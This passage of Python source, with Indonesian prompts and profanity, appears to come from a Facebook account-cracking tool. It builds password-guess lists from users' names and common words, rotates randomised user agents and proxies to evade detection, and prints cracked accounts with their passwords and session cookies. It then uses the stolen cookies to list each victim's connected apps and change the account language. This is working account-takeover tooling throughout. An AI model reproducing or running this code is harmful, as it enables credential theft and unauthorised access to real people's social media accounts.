							cp___ = cp__.add(f"{k}TANGGAL LAHIR{q}")
							cp___.add(f"{m}{ttl}{q}")
							prints(cp__)
					else:
						try:
							cp_ = Tree("                                 ",highlight=True, hide_root=True)
							cp__= cp_.add(f":bolivia::oman: {u}AKUN CP NI BOZZ{q}",guide_style="uu blue")
							cp___ = cp__.add(f"{k}ID DAN PASSWORD{q}")
							cp___.add(f"\r{m}{user}{q}|{m}{pw}{q}")
							cp___ = cp__.add(f"{k}TANGGAL LAHIR{q}")
							cp___.add(f"{m}{ttl}{q}")
							cp___ = cp__.add(f"{k}UserAgent{q}")
							cp____= cp___.add(f"{c}{ua}{q}")
							cp_____= cp____.add(f"{k}Information UserAgent{q}")
							cp______= cp_____.add(f"{b}OS{q}")
							cp______.add(f"{c}{os}{q}")
							cp______= cp_____.add(f"{b}LAYOUT{q}")
							cp______.add(f"{c}{layout}{q}")
							cp______= cp_____.add(f"{b}DEVICE HP{q}")
							cp______.add(f"{c}{hp}{q}")
							cp______= cp_____.add(f"{b}Jenis Browser{q}")
							cp______.add(f"{c}{browser}{q}")
							prints(cp__)
						except:
							cp_ = Tree("                                 ",highlight=True, hide_root=True)
							cp__= cp_.add(f":bolivia::oman: {u}AKUN CP NI BOZZ{q}",guide_style="uu blue")
							cp___ = cp__.add(f"{k}ID DAN PASSWORD{q}")
							cp___.add(f"\r{m}{user}{q}|{m}{pw}{q}")
							cp___ = cp__.add(f"{k}TANGGAL LAHIR{q}")
							cp___.add(f"{m}{ttl}{q}")
							cp___ = cp__.add(f"{k}UserAgent{q}")
							cp___.add(f"{c}{ua}{q}")
							prints(cp__)
					break
				else:continue
			self.chexk_ip_spam(user,memek,url)
#		except Exception as e:print(e)
		except:
			loop-=1
			self.method(user, memek,url)
	def buat_ugen(self):
		global ugen_
	#	{str(rc(aZ))}
	#	{str(rr(111,999))}
		rr = random.randint
		rc = random.choice
		aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
		aZ10 = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9','0']


		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=C, justify="center", width=60)
		tod.add_row(f"1\n2",f"UserAgent Bawaan\nManual")
		sol().print(tod, justify='center')

		pilih_ = input(f">--Pilih 1-5--> {q}")
		if pilih_ in ("1","01"):
			for x in range(2000):
				#A = f'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0; Android {str(rr(7,10))};'
				#B = f' MI 4LTE Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}63{str(rc(aZ))}; ) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/'
				#C = f'10.9.2.{str(rr(111,999))} U3/0.8.0 Mobile Safari/534.30'
				A__ = f'Mozilla/5.0 (Linux; U; Android {str(rr(1,10))}.{str(rr(1,10))}.{str(rr(1,10))}; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069'
				A_ = f'Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069'
#				A_ = f'Mozilla/5.0 (Linux; U; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069'
				B_ = f'{str(rc(aZ10))}{str(rc(aZ10))}{str(rc(aZ10))}{str(rc(aZ10))}{str(rc(aZ10))}'
#				B_ = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}'
				C_ = f'{str(rr(30,57))} Build/{B_}) AppleWebKit/537.36 (KHTML, like Gecko)'
				D_ = f' Version/4.0 Chrome/{str(rr(20,100))}.0.{str(rr(1111,9999))}.80 Mobile Safari/'
				E_ = f'537.36 HeyTapBrowser/{str(rr(2,40))}.7.36.1'


				F_ = f'{A_}{C_}{D_}{E_}'
				if F_ in ugen_:pass
				else:ugen_.append(F_)
#				F_ = f'{A__}{C_}{D_}{E_}'
#				if F_ in ugen_:pass
#				else:ugen_.append(F_)

		elif pilih_ in ("2","02"):
			try:
				jmlh = int(input(f">--Jumlah UserAgent--> "))
			except:jmlh=1
			for x in range(jmlh):
				ues=input('>--Masukan UserAgent--> ')
				if ues == '':
					kotak("# JANGAN KOSONG KONTOL",M,Q)
					time.sleep(5);self.buat_ugen()
				elif len(ues)<=34:
					kotak("# MINIMAL USERAGENT 35 KATA",M,Q)
					time.sleep(5);self.buat_ugen()
				else:
					ugen_.append(ues)
		else:
			kotak("# MAAF PILIHAN ANDA TIDAK DITEMUKAN",M,Q)
			self.buat_ugen()


	def pilih_url(self):
		global url_met
		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=C, justify="center", width=60)
		tod.add_row(f"1\n2\n3\n4\n5",f"Mobile {QQ}[{II}Recommended{QQ}]{CC}\nFree\nMbasic\nP\nX")
		sol().print(tod, justify='center')
		hu = input(f'>--{c}Pilih 1-4{q}--> ')
		if hu in ['1','01']:
			url_met = "mobile"
		elif hu in ['2','02']:
			url_met = "free"
		elif hu in ['3','03']:
			url_met = "mbasic"
		elif hu in ['4','04']:
			url_met = "p"
		elif hu in ['5','05']:
			url_met = "x"
		elif hu in ['6','06']:
			url_met = "random"
		else:
			kotak("# KONCOL TINGGAL PILIH 1-4 ITU AJA SUSAH, AJIM",C,Q)
			time.sleep(2)
			self.pilih_url()
	def pilih_mentod_(self):
		global method
#		tod = me()
#		tod.add_column("NO", style=I, justify="center")
#		tod.add_column("PILIHAN", style=C, justify="center", width=60)
#		tod.add_row(f"1\n2",f"Method 1\nMethod 2")
#		sol().print(tod, justify='center')
#		hu = input(f'>--{c}Pilih 1-2{q}--> ')
#		if hu in ['1','01']:
#			method = "ke1"
#		elif hu in ['2','02']:
#			method = "ke2"
#		else:
#			kotak("# KONCOL TINGGAL PILIH 1-2 ITU AJA SUSAH, AJIM",C,Q)
#			time.sleep(2)
#			self.pilih_mentod_()
		method = "ke1"

	def pilih_mentod(self):
		global method
		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=C, justify="center", width=60)
		tod.add_row(f"1\n2",f"Method 1\nMethod 2")
		sol().print(tod, justify='center')
		hu = input(f'>--{c}Pilih 1-4{q}--> ')
		if hu in ['1','01']:
			method = "ke1"
		elif hu in ['2','02']:
			method = "ke2"
#		elif hu in ['3','03']:
#			method = "ke3"
#			self.pilih_next()
#		elif hu in ['4','04']:
#			method = "ke4"
#		elif hu in ['5','05']:
#			method = "ke5"
		else:
			kotak("# KONCOL TINGGAL PILIH 1-5 ITU AJA SUSAH, AJIM",C,Q)
			time.sleep(2)
			self.pilih_mentod()


	def pilih_next(self):
		global link_app
		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=C, justify="center", width=60)
		tod.add_row(f"1\n2\n3\n4\n5\n6\n7",f"Free Fire\nHago\nRuang Guru\nBryanly\nHings Domino\nYandex\nAll Link(Random)")
		sol().print(tod, justify='center')
		hu = input(f'>--{c}Pilih 1-4{q}--> ')
		if hu in ['1','01']:
			#boyaah
			link_app=["https://auth.booyah.live/oauth/login?client_id=10058&redirect_uri=https%3A%2F%2Fbooyah.live%2Flogin&response_type=token&platform=3&locale=en-GB&state=return_url%3Dhttps%3A%2F%2Fbooyah.live%2F"]
		elif hu in ['2','02']:
			#Hago
			link_app=["https://m.facebook.com/v3.2/dialog/oauth?app_id=1443497502442589&cbt=1660006184043&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df22524a9ae24e8c%26domain%3Dwww.ihago.net%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.ihago.net%252Ff2e576f35ed6ab4%26relation%3Dopener&client_id=1443497502442589&display=touch&domain=www.ihago.net&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fwww.ihago.net%2Fa%2Fweb-login%2Findex.html%23%2F&locale=en_US&logger_id=f4075c8fa8864&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df591a111651cc%26domain%3Dwww.ihago.net%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.ihago.net%252Ff2e576f35ed6ab4%26relation%3Dopener%26frame%3Dff067454e6509c&response_type=token%2Csigned_request%2Cgraph_domain&sdk=joey&version=v3.2"]
		elif hu in ['3','03']:
			#Ruang Guru
			link_app=["https://m.facebook.com/v3.3/dialog/oauth?encrypted_query_string=AeDT2UXYR_53fiXztzu_JhFEBFfSJQgdUJGUXpWNi06kMvyZabZnxfdBZhZqn0UVav0tMQhs1d-jJsCtyUwNApPh-rjYgugWqF-e66qARB91xP624bvOxSjswdmzxS1zgvH4Ojj2MOEEW-Qi3bMycxfp8etyXlIdau3ppuAyyDbEBSIyiWvpC8Fl0k72v7CPgmvEGr6EvqJJ3P96Cmtf4nAFS8qWpLS3hwVpvr-cYADOlLya0mpQybTQ47egOAscvQV6EJZGU0gf4ptTfXhpcIb_ZLZh0gOKDftQzztpwa5jzDXQyiMFC94hijWNafrhSEZ8WtfinBYZkUVU4hbjM6CDzdO14HDUlHa-_QU3aQQo-V1wpnndx0cE1pNbOSuLpyW0E6q5MJ8qRZ7J2uX4PcmjsOBHRfOWA1hsBPQrHPnWoVidw8Lk67C4b9ult5CY578K5fHL447X3Wjq3jXxdSCEPNL-MLpW0bsjPM3-cNC1X9oYB6AjxpToI6zqS5ML-eRsA5VVeB89eS2X4xxcgveP2oOnFWUMyqQS7Ma1guZvlRvCc9rK7elLXdljMd743YV6RJLg7l_wGelvrdbGJAClrZQN2NPuvxLfUyOwIblHTTZ21mA8diwCfRFkmwbbg30y9ry6wN39pTXZdZlGEuoQezQO1qgJD845j2oGD057s9p3S-p10ljHw-eYOvx8u6gMFdWPmbmKIF6KKkJhdzwGh1JDoWRjmxvcXiZal1VM4S8ZE99uIM54eNlpB0wxcVVJZ92j72g4mc_75e1fEfhQw1ZSPlrfq4Auc3bYQFMZ7x87n8_Buv_V-33jSjl0XyXNUk9UQlRVLztDgihIRspczT94fGzhzksV0ASf0a9pyaYTrbsHjK_o7tGxLtCqneuiooMwvds0VB9BgpwlwhVMmotgV881fyZ-9Ge_CAYXenAoGUJMufxZ-P5FGIpWRy5XmJ6ZiE9KsnV2m2W11ZUDYozAHF_aiVjT3AxhN9tAyKv4shU0ChnURwPQOdT-N4_Bqwzu1kCIanP4rIYhzF8XsFjVt0ygH7Xv9kDDI2xifFdhmfNEEG0s91VRP0_3cLzIXEY0MLgpyvQ4qI6_KMGCTKnCUBsAnxhy9Dzj3pAJ5XcWVxp6UFihIk1czVytY_bQ_oBu4eHzWp8kXQeO_W34TJPJKrzvnyNDMpKKUKaaOl3kNPLvggYm5I5vb7kOk-KnIQgWy5vS2-M9MIOEQLiQBa58eig2tfBP9bVDRQ6xzeNghsXBO_HsX4UwLqdfLz0EbpplEIELjKRpzgDnr7hYN1sM4wvVmHMr98VROyWrNxc7Wy1FjxKeSl__wVLXxeIVg8SPa9kBr_hKJ6-3rQQUdHr6N7TqgXceyF9CTa1JDC9gKrN7oVCR9XfnN6hKmWA4T9mFOO5Dd5UYRAp6FlpjnHyv5dtsvRWfcA7RFC9nUTAXhGwODXxBNpY8BGc7Xh8vTDwTKqmsyUQN5V1czX8bxLhsWVLODZhaI37hREsTOLT5nHOrg0NYNcc-s80UANkPOpcpu_yQDko1fBGR3-ARPgRiLT4GX59glmvFSIIoVb9LnXT8-tRDBA"]
		elif hu in ['4','04']:
			#Bryanly
			link_app=["https://m.facebook.com/v3.2/dialog/oauth?app_id=546387748750105&auth_type=rerequest&cbt=1660007160700&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2fb47fad7408cc%26domain%3Dbrainly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ff255ac1c9862044%26relation%3Dopener&client_id=546387748750105&display=touch&domain=brainly.co.id&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fbrainly.co.id%2Ftugas%2F14548632&locale=en_US&logger_id=f2c7c938fdf214c&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1ee54b6e463df4%26domain%3Dbrainly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ff255ac1c9862044%26relation%3Dopener%26frame%3Df2e29c41357b38&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true&scope=public_profile%2C%20email&sdk=joey&version=v3.2"]
		elif hu in ['5','05']:
			#Hings Domino
			link_app=["https://m.facebook.com/v8.0/dialog/oauth?cct_prefetching=0&client_id=345000986033587&cbt=1660008418088&e2e=%7B%22init%22%3A1660008418088%7D&ies=1&sdk=android-8.2.0&sso=chrome_custom_tab&scope=public_profile%2Cuser_gender%2Cuser_friends&state=%7B%220_auth_logger_id%22%3A%22eb1f7549-f6ec-4e30-9e92-979a5a8b685f%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%2254e2vochhlvsm0areh4t%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fb345000986033587%3A%2F%2Fauthorize&auth_type=rerequest&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true"]
		elif hu in ['6','06']:
			#Yandex
			link_app=["https://m.facebook.com/v12.0/dialog/oauth?cct_prefetching=0&client_id=216570901687097&cbt=1660268970371&e2e=%7B%22init%22%3A1660268970371%7D&ies=0&sdk=android-12.2.0&sso=chrome_custom_tab&nonce=30032935-4997-43a5-abac-0d2c6cae81d5&scope=user_birthday%2Cuser_likes%2Copenid%2Cuser_link%2Cuser_gender%2Cemail&state=%7B%220_auth_logger_id%22%3A%2226cb2987-4616-4361-90ff-ab55b956e68f%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%225le280ansood69lmdd9e%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.ru.yandex.searchplugin&auth_type=rerequest&response_type=id_token%2Ctoken%2Csigned_request%2Cgraph_domain&return_scopes=true"]
		elif hu in ['7','07']:
			link_app=["https://m.facebook.com/v8.0/dialog/oauth?cct_prefetching=0&client_id=345000986033587&cbt=1660008418088&e2e=%7B%22init%22%3A1660008418088%7D&ies=1&sdk=android-8.2.0&sso=chrome_custom_tab&scope=public_profile%2Cuser_gender%2Cuser_friends&state=%7B%220_auth_logger_id%22%3A%22eb1f7549-f6ec-4e30-9e92-979a5a8b685f%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%2254e2vochhlvsm0areh4t%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fb345000986033587%3A%2F%2Fauthorize&auth_type=rerequest&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true",
			"https://m.facebook.com/v3.2/dialog/oauth?app_id=546387748750105&auth_type=rerequest&cbt=1660007160700&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2fb47fad7408cc%26domain%3Dbrainly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ff255ac1c9862044%26relation%3Dopener&client_id=546387748750105&display=touch&domain=brainly.co.id&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fbrainly.co.id%2Ftugas%2F14548632&locale=en_US&logger_id=f2c7c938fdf214c&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1ee54b6e463df4%26domain%3Dbrainly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ff255ac1c9862044%26relation%3Dopener%26frame%3Df2e29c41357b38&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true&scope=public_profile%2C%20email&sdk=joey&version=v3.2",
			"https://m.facebook.com/v3.2/dialog/oauth?app_id=546387748750105&auth_type=rerequest&cbt=1660007160700&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2fb47fad7408cc%26domain%3Dbrainly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ff255ac1c9862044%26relation%3Dopener&client_id=546387748750105&display=touch&domain=brainly.co.id&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fbrainly.co.id%2Ftugas%2F14548632&locale=en_US&logger_id=f2c7c938fdf214c&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1ee54b6e463df4%26domain%3Dbrainly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ff255ac1c9862044%26relation%3Dopener%26frame%3Df2e29c41357b38&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true&scope=public_profile%2C%20email&sdk=joey&version=v3.2",
			"https://auth.booyah.live/oauth/login?client_id=10058&redirect_uri=https%3A%2F%2Fbooyah.live%2Flogin&response_type=token&platform=3&locale=en-GB&state=return_url%3Dhttps%3A%2F%2Fbooyah.live%2F",
			"https://m.facebook.com/v3.3/dialog/oauth?encrypted_query_string=AeDT2UXYR_53fiXztzu_JhFEBFfSJQgdUJGUXpWNi06kMvyZabZnxfdBZhZqn0UVav0tMQhs1d-jJsCtyUwNApPh-rjYgugWqF-e66qARB91xP624bvOxSjswdmzxS1zgvH4Ojj2MOEEW-Qi3bMycxfp8etyXlIdau3ppuAyyDbEBSIyiWvpC8Fl0k72v7CPgmvEGr6EvqJJ3P96Cmtf4nAFS8qWpLS3hwVpvr-cYADOlLya0mpQybTQ47egOAscvQV6EJZGU0gf4ptTfXhpcIb_ZLZh0gOKDftQzztpwa5jzDXQyiMFC94hijWNafrhSEZ8WtfinBYZkUVU4hbjM6CDzdO14HDUlHa-_QU3aQQo-V1wpnndx0cE1pNbOSuLpyW0E6q5MJ8qRZ7J2uX4PcmjsOBHRfOWA1hsBPQrHPnWoVidw8Lk67C4b9ult5CY578K5fHL447X3Wjq3jXxdSCEPNL-MLpW0bsjPM3-cNC1X9oYB6AjxpToI6zqS5ML-eRsA5VVeB89eS2X4xxcgveP2oOnFWUMyqQS7Ma1guZvlRvCc9rK7elLXdljMd743YV6RJLg7l_wGelvrdbGJAClrZQN2NPuvxLfUyOwIblHTTZ21mA8diwCfRFkmwbbg30y9ry6wN39pTXZdZlGEuoQezQO1qgJD845j2oGD057s9p3S-p10ljHw-eYOvx8u6gMFdWPmbmKIF6KKkJhdzwGh1JDoWRjmxvcXiZal1VM4S8ZE99uIM54eNlpB0wxcVVJZ92j72g4mc_75e1fEfhQw1ZSPlrfq4Auc3bYQFMZ7x87n8_Buv_V-33jSjl0XyXNUk9UQlRVLztDgihIRspczT94fGzhzksV0ASf0a9pyaYTrbsHjK_o7tGxLtCqneuiooMwvds0VB9BgpwlwhVMmotgV881fyZ-9Ge_CAYXenAoGUJMufxZ-P5FGIpWRy5XmJ6ZiE9KsnV2m2W11ZUDYozAHF_aiVjT3AxhN9tAyKv4shU0ChnURwPQOdT-N4_Bqwzu1kCIanP4rIYhzF8XsFjVt0ygH7Xv9kDDI2xifFdhmfNEEG0s91VRP0_3cLzIXEY0MLgpyvQ4qI6_KMGCTKnCUBsAnxhy9Dzj3pAJ5XcWVxp6UFihIk1czVytY_bQ_oBu4eHzWp8kXQeO_W34TJPJKrzvnyNDMpKKUKaaOl3kNPLvggYm5I5vb7kOk-KnIQgWy5vS2-M9MIOEQLiQBa58eig2tfBP9bVDRQ6xzeNghsXBO_HsX4UwLqdfLz0EbpplEIELjKRpzgDnr7hYN1sM4wvVmHMr98VROyWrNxc7Wy1FjxKeSl__wVLXxeIVg8SPa9kBr_hKJ6-3rQQUdHr6N7TqgXceyF9CTa1JDC9gKrN7oVCR9XfnN6hKmWA4T9mFOO5Dd5UYRAp6FlpjnHyv5dtsvRWfcA7RFC9nUTAXhGwODXxBNpY8BGc7Xh8vTDwTKqmsyUQN5V1czX8bxLhsWVLODZhaI37hREsTOLT5nHOrg0NYNcc-s80UANkPOpcpu_yQDko1fBGR3-ARPgRiLT4GX59glmvFSIIoVb9LnXT8-tRDBA",
			"https://m.facebook.com/v12.0/dialog/oauth?cct_prefetching=0&client_id=216570901687097&cbt=1660268970371&e2e=%7B%22init%22%3A1660268970371%7D&ies=0&sdk=android-12.2.0&sso=chrome_custom_tab&nonce=30032935-4997-43a5-abac-0d2c6cae81d5&scope=user_birthday%2Cuser_likes%2Copenid%2Cuser_link%2Cuser_gender%2Cemail&state=%7B%220_auth_logger_id%22%3A%2226cb2987-4616-4361-90ff-ab55b956e68f%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%225le280ansood69lmdd9e%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.ru.yandex.searchplugin&auth_type=rerequest&response_type=id_token%2Ctoken%2Csigned_request%2Cgraph_domain&return_scopes=true"]
		else:
			kotak("# KONCOL TINGGAL PILIH 1-5 ITU AJA SUSAH, AJIM",C,Q)
			time.sleep(2)
			self.pilih_next()



	def pilih_fps(self):
		global fps
#		tod = me()
#		tod.add_column("NO", style=I, justify="center")
#		tod.add_column("PILIHAN", style=C, justify="center", width=60)
#		tod.add_row(f"1\n2",f"B-API\n{UU}MOBILE{QQ}/{KK}MBASIC{QQ}/{MM}FREE{QQ}/{II}P{QQ}/{KK}X{QQ}")
#		sol().print(tod, justify='center')
#		hu = input(f'>--{c}Pilih 1-2{q}--> ')
		hu="2"
		if hu in ['1','01']:
			fps = "fast"
		elif hu in ['2','02']:
			fps = "kontol"
		else:
			kotak("# KONCOL TINGGAL PILIH 1-2 ITU AJA SUSAH, AnJIM",C,Q)
			time.sleep(2)
			self.pilih_fps()


	def tanya_prox_k(self):
		global prox_k
		iprint(Panel(f'{CC}Apakah Anda Ingin Menggunkan Proxy{QQ}'))
		kp = input(f'>--Y/n--> ')
		if kp in [""," "]:
			kotak("# JANGAN KOSONG KONTOL", M,Q)
			time.sleep(3),self.tanya_apk()
		elif kp in ["y","Y"]:
			prox_k = "Risky_Ganteng"
		elif kp in ["n","N"]:
			prox_k = "PEPEK"

		else:
			tod = f"{MM}Maaf Pilihan {QQ}[{CC}{kp}{QQ}] {MM}Anda Tidak Tersedia.."
			iprint(Panel(tod, style=Q))
			time.sleep(3),self.tanya_prox_k()


	def tanya_opsi(self):
		global opsi_y
		iprint(Panel(f'{CC}Apakah Anda Ingin Menampilkan Opsi Sesi Akun{QQ}'))
		kp = input(f'>--Y/n--> ')
		if kp in [""," "]:
			kotak("# JANGAN KOSONG KONTOL", M,Q)
			time.sleep(3),self.tanya_apk()
		elif kp in ["y","Y"]:
			opsi_y = "IYA"
		elif kp in ["n","N"]:
			opsi_y = "PEPEK"

		else:
			tod = f"{MM}Maaf Pilihan {QQ}[{CC}{kp}{QQ}] {MM}Anda Tidak Tersedia.."
			iprint(Panel(tod, style=Q))
			time.sleep(3),self.tanya_opsi()
	def tanya_apk(self):
		global apk_me
		iprint(Panel(f"{CC}Apakah Anda Ingin Menampilkan Aplikasi{QQ}({KK}Tidak Recommended{QQ})", style=Q, title="PEPEK ENGGA DIBACA"))
		kp = input(f'>--Y/n--> ')
		if kp in [""," "]:
			kotak("# JANGAN KOSONG KONTOL", M,Q)
			time.sleep(3),self.tanya_apk()
		elif kp in ["y","Y"]:
			apk_me = "IYA"
		elif kp in ["n","N"]:
			apk_me = "PEPEK"

		else:
			tod = f"{MM}Maaf Pilihan {QQ}[{CC}{kp}{QQ}] {MM}Anda Tidak Tersedia.."
			iprint(Panel(tod, style=Q))
			time.sleep(3),self.tanya_apk()
	def pas_me(self):
		global pass_
		iprint(Panel(f"{CC}Silahkan Pilih Kombinasi Password Crack{QQ}", style=Q, title="BACA DULU KONTOL"))
		wwe = me()
		wwe.add_column("NO", style=K, justify="center")
		wwe.add_column("PILIHAN", style=C, justify="center", width=60)
		wwe.add_row("1\n2\n3\n4\n5\n6", "name123,name12345\nname,name123,name1234,name12345\nname,name123,name12345,sayang,anjing,kontol\nname,name123,name12345 + 6 Password\nname,name123,name1234,name12345 + MANUAL\nMANUAL")
		sol().print(wwe, justify='center')
		kol = input(f">--Pilih 1-4--> ")
		if kol in [" ",""]:
			kotak("# JANGAN KOSONG KONTOL", M,Q)
			time.sleep(3),self.pas_me()
		elif kol in ["1","01"]:
			pass_ = "1"
		elif kol in ["2","02"]:
			pass_ = "2"
		elif kol in ["3","03"]:
			pass_ = "3"
		elif kol in ["4","04"]:
			pass_ = "4"
		elif kol in ["5","05"]:
			pass_ = "5"
			kotak("# GUNAKAN , (koma) Untuk Pemisah Password Dan Minimal Pass 6 Huruf/Angka",I,M)
			pwx = input(f">--{k}Password{q}--> ")
			if pwx == '':
				kotak("# JANGAN KOSONG, KONTOL BIG",M,Q)
				time.sleep(3),self.pas_me()
			elif len(pwx)<=5:
				kotak("# MINIMAL PASSWORD HARUS LEBIH DARI 5 HURUF/ANGKA",K,Q)
				time.sleep(3),self.pas_me()
			else:
				pass_man=pwx

		elif kol in ["6","06"]:
			pass_ = "6"
			kotak("# GUNAKAN , (koma) Untuk Pemisah Password Dan Minimal Pass 6 Huruf/Angka",I,M)
			pwx = input(f">--{k}Password{q}--> ")
			if pwx == '':
				kotak("# JANGAN KOSONG, KONTOL BIG",M,Q)
				time.sleep(3),self.pas_me()
			elif len(pwx)<=5:
				kotak("# MINIMAL PASSWORD HARUS LEBIH DARI 5 HURUF/ANGKA",K,Q)
				time.sleep(3),self.pas_me()
			else:
				pass_man=pwx

		else:
			tod = f"{MM}Maaf Pilihan {QQ}[{CC}{kol}{QQ}] {MM}Anda Tidak Tersedia.."
			iprint(Panel(tod, style=Q))
			time.sleep(3),self.pas_me()

def ubah_cok(cookie):
	try:
		cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	except:
		cok=cookie
	return(str(cok))
def get_apk(user,pw,cok):
	cookie = {"cookie":cok}
	ok_ = Tree("               ",highlight=True, hide_root=True)
	ok__= ok_.add(f":bolivia::oman: {o}AKUN OK NI BOZZ{q}",guide_style="uu green")

	ok___ = ok__.add(f"{b}ID DAN PASSWORD{q}")
	ok___.add(f"\r{i}{user}{q}|{i}{pw}{q}")

	ok___ = ok__.add(f"{b}COOKIES{q}")
	ok___.add(f"{c}{cok}{q}")


	try:
		active = Tree(f"\r{b}Aplikasi Aktif{q}:")
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
		get_active(url,active,cookie)
	except Exception as e:
		print(e)
	try:
		inactive = Tree(f"\r{b}Aplikasi Tidak Aktif{q}:")
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
		get_inactive(url,inactive,cookie)
	except Exception as e:
		print(e)
	ok__.add(active)
	ok__.add(inactive)

	code="""Wans X Gans
Jeck X Nano
Xenzi Ganz
Radhin Al Haady
Zee K World
Moch Aang Ardiansyah XD.
Risky"""
	pyhon = Syntax(code, "python", theme="monokai", line_numbers=True)
	ok____= ok__.add(f"{b}Thanks To:{q}")
	ok____.add(Group(pyhon))
	prints(ok__)



def get_active(url,active,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).text,"html.parser")
		for apk in data.find_all("h3"):
			if "Ditambahkan" in apk.text:
				active.add(f"\r{i}{str(apk.text).replace('Ditambahkan',' Ditambahkan')}{q}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find("a",string="Lihat Lainnya")["href"]
		get_active(next,active,cookie)
	except:pass

def get_inactive(url,inactive,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).text,"html.parser")
		for apk in data.find_all("h3"):
			if "Kedaluwarsa" in apk.text:
				inactive.add(f"\r{m}{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}{q}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find("a",string="Lihat Lainnya")["href"]
		get_inactive(next,inactive,cookie)
	except:pass

def ubah_bahasa(cookie):
	try:
		url = ses.get('https://mbasic.facebook.com/language/',cookies=cookie)
		data = parser(url.text,'html.parser')
		for x in data.find_all('form',{'method':'post'}):
			if 'Bahasa Indonesia' in str(x):
				bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}
